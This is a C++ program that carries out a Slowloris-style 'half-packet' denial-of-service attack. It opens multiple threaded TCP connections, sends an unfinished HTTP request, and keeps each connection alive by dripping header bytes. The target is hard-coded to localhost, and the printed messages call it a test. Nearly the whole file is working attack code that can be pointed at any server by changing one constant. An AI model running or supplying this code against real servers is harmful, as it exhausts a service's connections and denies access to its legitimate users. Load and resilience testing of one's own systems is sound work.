#include <iostream>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 8080;

void halfPacketAttack(int durationSeconds) {
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
#ifdef _WIN32
        WSACleanup();
#endif
        return;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) != 0) {
        close(sock);
#ifdef _WIN32
        WSACleanup();
#endif
        return;
    }

    std::cout << "Connected, starting half-packet attack..." << std::endl;

    const char* partialRequest = "GET /index.html HTTP/1.1\r\nHost: localhost\r\n";
    send(sock, partialRequest, strlen(partialRequest), 0);

    auto startTime = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
               std::chrono::steady_clock::now() - startTime
           ).count() < durationSeconds) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        send(sock, "X-", 2, 0);
    }

    close(sock);
#ifdef _WIN32
    WSACleanup();
#endif
}

int main(int argc, char* argv[]) {
    int numThreads = 5;
    int durationSeconds = 30;

    if (argc >= 2) {
        numThreads = std::stoi(argv[1]);
    }
    if (argc >= 3) {
        durationSeconds = std::stoi(argv[2]);
    }

    std::cout << "Starting half-packet attack test..." << std::endl;
    std::cout << "Threads: " << numThreads << std::endl;
    std::cout << "Duration per thread: " << durationSeconds << "s" << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < numThreads; ++i) {
        threads.emplace_back(halfPacketAttack, durationSeconds);
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "Test completed!" << std::endl;
    return 0;
}